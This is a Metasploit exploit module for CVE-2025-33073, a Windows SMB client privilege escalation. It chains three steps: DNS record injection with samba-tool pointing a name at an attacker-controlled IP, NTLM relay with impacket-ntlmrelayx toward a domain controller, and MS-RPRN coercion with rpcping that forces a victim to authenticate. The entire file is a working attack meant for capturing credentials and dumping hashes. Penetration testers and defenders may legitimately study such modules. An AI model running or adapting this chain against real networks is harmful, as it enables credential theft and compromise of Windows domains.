##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking  # As this is a complex chain requiring specific setup

  include Msf::Exploit::Remote::Tcp  # If needed for any connections, but mainly local cmds

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows 11 SMB Client Privilege Escalation via DNS Injection, NTLM Relay, and RPC Coercion',
      'Description'    => %q{
        This module exploits improper access control in Windows SMB clients (CVE-2025-33073),
        leading to elevation of privilege through a complex attack chain:

        1. DNS record injection using samba-tool to poison DNS resolution.
        2. NTLM relay attacks using impacket-ntlmrelayx to relay authentication.
        3. Coercion of a victim system (including Windows 11) to authenticate to an
           attacker-controlled server via MS-RPRN RPC calls.

        The exploit affects multiple Windows versions including Windows 11 (10.0.22621.x),
        Windows Server 2022, and earlier versions vulnerable to this method.

        Requirements:
        - Attacker must have admin privileges on the DNS server (e.g., Domain Controller).
        - Victim must be an authenticated domain user.
        - Environment must not have mitigations like SMB signing enforced or Extended
          Protection for Authentication (EPA).
        - Tools like samba-tool, impacket-ntlmrelayx, and rpcping must be available on the
          framework host (e.g., Kali Linux).

        Upon successful relay, monitor ntlmrelayx output for captured credentials or further
        actions (e.g., hash dumping). This module does not automatically execute payloads
        post-relay; extend as needed.

        Affected Versions:
        - Windows 11 versions 22H2, 22H3, 23H2, 24H2 (10.0.22621.x and 10.0.26100.x)
        - Windows Server 2022 (including 23H2 editions)
        - Windows Server 2019
        - Windows 10 versions from 1507 up to 22H2
        - Windows Server 2016 and 2008 (with appropriate versions)

        Tested on: Windows 11 version 22H2, Windows Server 2022, Kali Linux 2024.2
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Shaheer Yasir'  # Original PoC author
      ],
      'References'     => [
        ['CVE', '2025-33073']
      ],
      'Platform'       => ['win'],
      'Arch'           => [ ARCH_X64, ARCH_X86 ],
      'Targets'        => [
        [
          'Windows 11 / Server 2022 (x64)', {
            'Arch' => ARCH_X64
          }
        ],
        [
          'Windows 10 / Server 2019 (x86)', {
            'Arch' => ARCH_X86
          }
        ]
      ],
      'Payload'        => {
        'DisablePayloadHandler' => true  # As relay handles execution; payload optional for post-exploitation
      },
      'Privileged'     => true,
      'DisclosureDate' => '2025-06-13',
      'DefaultTarget'  => 0,
      'Notes'          => {
        'Stability'    => [CRASH_SAFE],
        'Reliability'  => [REPEATABLE_SESSION],
        'SideEffects'  => [ARTIFACTS_ON_TARGET, IOC_IN_LOGS]
      }
    ))

    register_options([
      OptString.new('ATTACKER_IP', [true, 'IP address of the attacker-controlled server (relay listener)', '192.168.1.100']),
      OptString.new('DNS_IP', [true, 'IP address of the DNS server (usually the DC)', '192.168.1.10']),
      OptString.new('DC_FQDN', [true, 'Fully qualified domain name of the domain controller', 'dc.example.com']),
      OptString.new('TARGET', [true, 'Target system to relay authentication to (e.g., DC IP for hash dump)', '192.168.1.10']),
      OptString.new('VICTIM_IP', [true, 'IP address of the victim system to coerce authentication from', '192.168.1.50']),
      OptString.new('SAMBA_USER', [false, 'Username for samba-tool (default: Administrator)', 'Administrator']),
      OptString.new('SAMBA_PASS', [false, 'Password for samba-tool (default: YourPassword)', 'YourPassword'])
    ])
  end

  def check
    # Basic check: verify required tools are available on host
    tools = ['samba-tool', 'impacket-ntlmrelayx', 'rpcping']
    missing = tools.select { |tool| system("which #{tool}", [:out => '/dev/null']) != true }
    if !missing.empty?
      return CheckCode::Detected("Missing tools on host: #{missing.join(', ')}. Install them for exploitation.")
    end

    # Additional check: resolve DC_FQDN
    begin
      ips = Resolv.getaddresses(datastore['DC_FQDN'])
      vprint_good("DC #{datastore['DC_FQDN']} resolves to: #{ips.join(', ')}")
    rescue Resolv::ResolvError
      return CheckCode::Unknown("Cannot resolve DC FQDN: #{datastore['DC_FQDN']}")
    end

    CheckCode::Detected("Environment appears suitable for exploitation.")
  end

  def log_subprocess_output(stdout, stderr, prefix)
    unless stdout.empty?
      vprint_status("#{prefix} STDOUT:\n#{stdout}")
    end
    unless stderr.empty?
      vprint_error("#{prefix} STDERR:\n#{stderr}")
    end
  end

  def inject_dns_record
    print_status("Injecting DNS record via samba-tool (requires admin privileges)...")
    cmd = [
      'samba-tool', 'dns', 'add', datastore['DNS_IP'], datastore['DC_FQDN'],
      'relaytrigger', 'A', datastore['ATTACKER_IP'],
      "--username=#{datastore['SAMBA_USER']}", "--password=#{datastore['SAMBA_PASS']}"
    ].join(' ')

    stdout, stderr, status = Open3.capture3(cmd)
    if status.success?
      print_good("DNS record successfully added.")
      log_subprocess_output(stdout, stderr, "[samba-tool]")
    else
      log_subprocess_output(stdout, stderr, "[samba-tool]")
      fail_with(Failure::NoAccess, "Failed to add DNS record. Check credentials and connectivity.")
    end
  end

  def check_record(fqdn)
    print_status("Verifying DNS record propagation...")
    10.times do |i|
      begin
        Timeout.timeout(5) do
          ip = Resolv.getaddress(fqdn)
          if ip == datastore['ATTACKER_IP']
            print_good("DNS record resolved to: #{ip}")
            return true
          end
        end
      rescue Timeout::Error, Resolv::ResolvError
        # Continue on error
      end
      sleep 2
      vprint_status("Attempt #{i+1}/10...")
    end
    print_error("DNS record did not propagate or resolve.")
    return false
  end

  def start_ntlmrelay
    print_status("Starting NTLM relay server (impacket-ntlmrelayx)...")
    log_file = "#{Msf::Config.local_directory}/logs/ntlmrelayx_#{datastore['TARGET'].gsub(/\./, '_')}.log"
    cmd = "impacket-ntlmrelayx -t #{datastore['TARGET']} --no-smb-server"

    pid = Process.spawn(cmd, :out => [log_file, "w"], :err => [log_file, "w"])
    Process.detach(pid)
    print_good("NTLM relay server started (PID: #{pid}). Output logged to #{log_file}.")
    @relay_pid = pid
  end

  def trigger_coercion(fqdn)
    print_status("Triggering victim to authenticate via MS-RPRN RPC coercion...")
    cmd = [
      'rpcping',
      '-t', "ncacn_np:#{datastore['VICTIM_IP']}[\\pipe\\spoolss]",
      '-s', fqdn,
      '-e', '1234',
      '-a', 'n',
      '-u', 'none',
      '-p', 'none'
    ].join(' ')

    stdout, stderr, status = Open3.capture3(cmd)
    if status.success?
      print_good("Coercion RPC call sent successfully.")
      log_subprocess_output(stdout, stderr, "[rpcping]")
    else
      log_subprocess_output(stdout, stderr, "[rpcping]")
      fail_with(Failure::Unreachable, "RPC coercion failed. Verify victim connectivity and service status.")
    end
  end

  def cleanup
    if @relay_pid
      begin
        Process.kill('TERM', @relay_pid)
        print_status("Terminated NTLM relay server (PID: #{@relay_pid}).")
      rescue Errno::ESRCH
        # Already dead
      end
    end
    super
  end

  def exploit
    fail_with(Failure::BadConfig, "This module requires admin access to DNS server.") if !datastore['SAMBA_USER']

    record = 'relaytrigger'
    fqdn = "#{record}.#{datastore['DC_FQDN']}"

    inject_dns_record
    return if not check_record(fqdn)

    start_ntlmrelay
    sleep 5  # Wait for relay server to be ready

    trigger_coercion(fqdn)

    print_good("Exploit chain triggered. Monitor ntlmrelayx log for authentication relays and captured credentials.")
    print_warning("Relay server will run in background; use 'sessions -K' or manual kill if needed.")
  end
end
